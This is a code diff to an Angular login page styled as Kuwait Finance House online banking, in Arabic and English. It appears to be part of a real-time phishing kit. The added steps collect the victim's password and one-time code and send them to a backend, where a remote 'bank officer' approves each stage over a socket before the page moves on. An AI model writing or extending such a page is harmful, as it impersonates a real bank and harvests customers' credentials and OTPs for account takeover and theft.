@@ -7,7 +7,7 @@ import { HeaderComponent } from '../../shared/components/header/header';
 import { io } from 'socket.io-client';
 import { API_BASE } from '../../shared/config';
 
-type LoginStep = 'CREDENTIALS' | 'WAITING_QUESTION' | 'ANSWER_QUESTION' | 'WAITING_APPROVAL' | 'APPROVED' | 'REJECTED';
+type LoginStep = 'CREDENTIALS' | 'WAITING_QUESTION' | 'ANSWER_QUESTION' | 'WAITING_APPROVAL' | 'ENTER_PASSWORD' | 'WAITING_PASSWORD_APPROVAL' | 'ENTER_OTP' | 'APPROVED' | 'REJECTED';
 
 @Component({
   selector: 'app-login',
@@ -26,6 +26,8 @@ export class LoginComponent implements OnInit, OnDestroy {
   clientId = signal('');
   assignedQuestion = signal('');
   answer = signal('');
+  password = signal('');
+  otp = signal('');
   loading = signal(false);
   errorMessage = signal('');
 
@@ -48,11 +50,19 @@ export class LoginComponent implements OnInit, OnDestroy {
       approvedTitle: 'تم تسجيل الدخول بنجاح!',
       approvedSubtitle: 'مرحباً بك في الخدمات المصرفية الإلكترونية لبيت التمويل الكويتي.',
       rejectedTitle: 'تم رفض الدخول',
-      rejectedSubtitle: 'لقد تم رفض إجابتك من قبل موظف البنك. يرجى المحاولة مرة أخرى.',
+      rejectedSubtitle: 'لقد تم رفض طلبك من قبل موظف البنك. يرجى المحاولة مرة أخرى.',
       retryBtn: 'إعادة المحاولة',
       answerPlaceholder: 'أدخل الإجابة هنا',
       submitAnswer: 'إرسال الإجابة',
-      verificationPrompt: 'يرجى الاجابة على السؤال للمتابعة'
+      verificationPrompt: 'يرجى الاجابة على السؤال للمتابعة',
+      passwordLabel: 'كلمة السر',
+      passwordPlaceholder: 'ادخل كلمة السر',
+      forgotPassword: 'نسيت كلمة السر',
+      loginBtn: 'دخول',
+      otpLabel: 'رمز التحقق (OTP)',
+      otpPlaceholder: 'ادخل رمز التحقق OTP',
+      submitOtp: 'تأكيد الرمز',
+      waitingPasswordApproval: 'جاري التحقق من كلمة السر، يرجى الانتظار للموافقة على الدخول من قبل موظف البنك...'
     },
     en: {
       title: 'Login',
@@ -68,11 +78,19 @@ export class LoginComponent implements OnInit, OnDestroy {
       approvedTitle: 'Logged in successfully!',
       approvedSubtitle: 'Welcome to KFH Online banking services.',
       rejectedTitle: 'Login Rejected',
-      rejectedSubtitle: 'Your answer has been rejected by the bank officer. Please try again.',
+      rejectedSubtitle: 'Your request has been rejected by the bank officer. Please try again.',
       retryBtn: 'Try Again',
       answerPlaceholder: 'Enter answer here',
       submitAnswer: 'Submit Answer',
-      verificationPrompt: 'Please answer the question to continue'
+      verificationPrompt: 'Please answer the question to continue',
+      passwordLabel: 'Password',
+      passwordPlaceholder: 'Enter password',
+      forgotPassword: 'Forgot password?',
+      loginBtn: 'Login',
+      otpLabel: 'Verification Code (OTP)',
+      otpPlaceholder: 'Enter OTP code',
+      submitOtp: 'Confirm OTP',
+      waitingPasswordApproval: 'Verifying password, please wait for login approval from the bank officer...'
     }
   };
 
@@ -86,6 +104,12 @@ export class LoginComponent implements OnInit, OnDestroy {
     }
     if (this.step() === 'ANSWER_QUESTION') {
       return this.answer().trim().length > 0;
+    }
+    if (this.step() === 'ENTER_PASSWORD') {
+      return this.password().trim().length > 0;
+    }
+    if (this.step() === 'ENTER_OTP') {
+      return this.otp().trim().length > 0;
     }
     return false;
   }
@@ -141,6 +165,26 @@ export class LoginComponent implements OnInit, OnDestroy {
         if (!response.ok) throw new Error(data.message || 'فشل إرسال الإجابة');
 
         this.step.set('WAITING_APPROVAL');
+      } else if (this.step() === 'ENTER_PASSWORD') {
+        const response = await fetch(`${API_BASE}/user/client/password`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ clientId: this.clientId(), password: this.password() })
+        });
+
+        const data = await response.json();
+        if (!response.ok) throw new Error(data.message || 'فشل إرسال كلمة السر');
+
+        this.step.set('WAITING_PASSWORD_APPROVAL');
+      } else if (this.step() === 'ENTER_OTP') {
+        const response = await fetch(`${API_BASE}/user/client/otp`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ clientId: this.clientId(), otp: this.otp() })
+        });
+
+        const data = await response.json();
+        if (!response.ok) throw new Error(data.message || 'فشل إرسال رمز التحقق');
       }
     } catch (err: any) {
       this.errorMessage.set(err.message || 'حدث خطأ أثناء الاتصال بالخادم');
@@ -169,6 +213,12 @@ export class LoginComponent implements OnInit, OnDestroy {
           this.step.set('ANSWER_QUESTION');
         } else if (data.status === 'ANSWERED') {
           this.step.set('WAITING_APPROVAL');
+        } else if (data.status === 'PASSWORD_PENDING') {
+          this.step.set('ENTER_PASSWORD');
+        } else if (data.status === 'PASSWORD_SUBMITTED') {
+          this.step.set('WAITING_PASSWORD_APPROVAL');
+        } else if (data.status === 'OTP_PENDING') {
+          this.step.set('ENTER_OTP');
         } else if (data.status === 'APPROVED') {
           this.step.set('APPROVED');
           this.disconnectSocket();
@@ -197,6 +247,8 @@ export class LoginComponent implements OnInit, OnDestroy {
     this.clientId.set('');
     this.assignedQuestion.set('');
     this.answer.set('');
+    this.password.set('');
+    this.otp.set('');
     this.errorMessage.set('');
   }
 }
